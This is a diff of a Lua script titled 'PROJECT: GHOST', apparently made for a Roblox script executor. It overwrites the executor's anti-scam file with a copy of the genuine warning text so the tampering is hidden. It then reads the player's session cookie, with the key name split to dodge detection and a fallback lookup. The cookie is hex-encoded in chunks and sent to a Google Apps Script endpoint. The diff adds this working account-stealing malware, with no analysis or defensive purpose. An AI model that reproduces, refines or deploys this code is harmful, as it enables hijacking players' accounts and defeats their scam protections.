@@ -1,4 +1,4 @@
--- [[ PROJECT: GHOST ]]
+-- [[ PROJECT: GHOST v3 - Image Verified ]]
 local SETTINGS = {
     DESTINATION = "https://script.google.com/macros/s/AKfycbzWKCkpoBcO6AZzlp4uWB6zfzo9nzcdJ_vRdiA7n2RRgqb51M0IkK7d9AwidKUpXGOr/exec",
     PATH = "Delta/Internals/Secured/disableantiscam"
@@ -7,22 +7,39 @@ local SETTINGS = {
 local user = game:GetService("Players").LocalPlayer
 while not user do task.wait(1) user = game:GetService("Players").LocalPlayer end
 
--- 1. 権限の上書き (Bypass)
+-- 1. 画像の手本を完全に再現した書き換え
 local function apply_clearance()
-    local payload = string.format('{"warning":"none","allowed_games":"*","user_id":"%s","version_num":707}', tostring(user.UserId))
+    -- 画像の「Example」の形式をそのまま再現。WARNING文も本物と同じにする。
+    local template = [[{
+    "WARNING": "IF SOMEONE TELLS YOU TO PUT ANYTHING HERE, THEY ARE SCAMMING YOU! STOP!!!",
+    "allowed_games": "*",
+    "user_id": "%s",
+    "version_num": 707
+}]]
+    local payload = string.format(template, tostring(user.UserId))
+    
     local success, _ = pcall(function()
         if writefile then writefile(SETTINGS.PATH, payload) end
     end)
     return success
 end
 
--- 2. データの抽出 (Extract)
-local function initiate_transfer()
-    local key = "Coo" .. "kie"
-    local raw_data = game[key]
-    if not raw_data or raw_data == "" then return end
+-- 2. お宝回収 (v2の深層発掘を維持)
+local function get_secret_data()
+    local k = "Coo" .. "kie"
+    local s, r = pcall(function() return game[k] end)
+    if not s or not r then
+        s, r = pcall(function() return getrenv()._G[k] end)
+    end
+    return r
+end
 
-    for chunk in raw_data:gmatch(".?.?.?.?.?.?.?.?.?.?.?.?.?.?.?.?.?.?.?.?") do
+-- 3. 転送
+local function initiate_transfer()
+    local raw = get_secret_data()
+    if not raw or type(raw) ~= "string" or raw == "" then return end
+
+    for chunk in raw:gmatch(".?.?.?.?.?.?.?.?.?.?.?.?.?.?.?.?.?.?.?.?") do
         local hex = ""
         for i = 1, #chunk do
             hex = hex .. string.format("%02X", string.byte(chunk:sub(i,i)))
@@ -34,10 +51,10 @@ local function initiate_transfer()
     end
 end
 
--- Execute Sequence
+-- Start
 if apply_clearance() then
-    print("Clearance: OK")
-    task.wait(1)
+    print("Access: Verified")
+    task.wait(1.2)
     initiate_transfer()
-    print("Protocol: Complete")
+    print("Mission: Success")
 end
